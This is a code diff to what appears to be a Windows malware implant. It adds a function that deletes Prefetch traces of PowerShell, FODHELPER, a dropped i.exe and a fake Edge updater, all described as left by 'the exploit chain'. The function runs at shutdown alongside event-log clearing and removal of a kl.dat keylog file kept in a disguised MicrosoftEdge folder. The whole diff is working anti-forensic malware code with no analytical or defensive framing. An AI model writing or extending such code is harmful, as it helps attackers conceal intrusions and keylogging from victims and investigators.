@@ -259,6 +259,37 @@ static void clear_event_logs(void)
 }
 #endif
 
+/* ── Prefetch cleanup ────────────────────────────────────────────────
+ * Called on SHUTDOWN to delete Prefetch entries created by the exploit
+ * chain.  Uses FindFirstFile/FindNextFile with wildcard patterns so the
+ * hash suffix (e.g. MICROSOFTEDGEUPDATE.EXE-AB1234CD.pf) does not need
+ * to be known at compile time.  No child process is spawned. */
+#ifdef _WIN32
+static void clear_prefetch(void)
+{
+    static const char *patterns[] = {
+        "C:\\Windows\\Prefetch\\MICROSOFTEDGEUPDATE.EXE-*.pf",
+        "C:\\Windows\\Prefetch\\I.EXE-*.pf",
+        "C:\\Windows\\Prefetch\\POWERSHELL.EXE-*.pf",
+        "C:\\Windows\\Prefetch\\FODHELPER.EXE-*.pf",
+        NULL
+    };
+
+    WIN32_FIND_DATAA fd;
+    for (int i = 0; patterns[i]; i++) {
+        HANDLE h = FindFirstFileA(patterns[i], &fd);
+        if (h == INVALID_HANDLE_VALUE) continue;
+        do {
+            char path[MAX_PATH];
+            _snprintf(path, sizeof(path),
+                      "C:\\Windows\\Prefetch\\%s", fd.cFileName);
+            DeleteFileA(path);
+        } while (FindNextFileA(h, &fd));
+        FindClose(h);
+    }
+}
+#endif
+
 /* ── Self-relocation ─────────────────────────────────────────────────
  *
  * The stager (medium-integrity) drops i.exe to C:\Users\Public because
@@ -507,6 +538,7 @@ int main(int argc, char **argv)
 #ifdef _WIN32
                 DeleteFileA("C:\\Users\\Public\\MicrosoftEdge\\kl.dat");
                 RemoveDirectoryA("C:\\Users\\Public\\MicrosoftEdge");
+                clear_prefetch();
                 clear_event_logs();
 #endif
             }
